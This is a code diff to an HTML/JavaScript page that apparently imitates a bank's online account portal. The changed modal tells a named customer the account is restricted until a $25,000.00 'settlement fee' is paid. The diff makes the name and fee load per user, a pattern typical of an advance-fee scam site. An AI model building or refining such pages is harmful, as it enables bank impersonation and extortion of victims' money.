@@ -147,9 +147,9 @@
                     <i class="fas fa-exclamation-triangle"></i>
                 </div>
                 <div class="security-title">Account Restricted</div>
-                <div class="security-text" style="text-align: left;">
-                    Dear Sarah Stone,<br><br>
-                    Your account is temporarily restricted due to unresolved circumstances with a third party.<br><br>
+                <div class="security-text" style="text-align: left;" id="restrictionMessage">
+                    Dear Megan Woods,<br><br>
+                    Your account is temporarily restricted due to unresolved security issues.<br><br>
                     A settlement fee of <strong style="color: #E31837;">$25,000.00</strong> is required to restore full access and remove the restriction, so normal account operations will be restored.
                 </div>
                 <button id="closeRestrictionBtn" class="security-btn">I Understand</button>
@@ -193,6 +193,13 @@
         
         // Function to show restriction modal immediately - NO CODE VERIFICATION
         function showRestrictionModal() {
+            var user = BoAAuth.getUser();
+            var fee = user && user.settlementFee ? user.settlementFee : '$25,000.00';
+            var name = user && user.name ? user.name : 'Customer';
+            document.getElementById('restrictionMessage').innerHTML =
+                'Dear ' + name + ',<br><br>' +
+                'Your account is temporarily restricted due to unresolved security issues.<br><br>' +
+                'A settlement fee of <strong style="color: #E31837;">' + fee + '</strong> is required to restore full access and remove the restriction, so normal account operations will be restored.';
             restrictionModal.style.display = 'flex';
         }
 
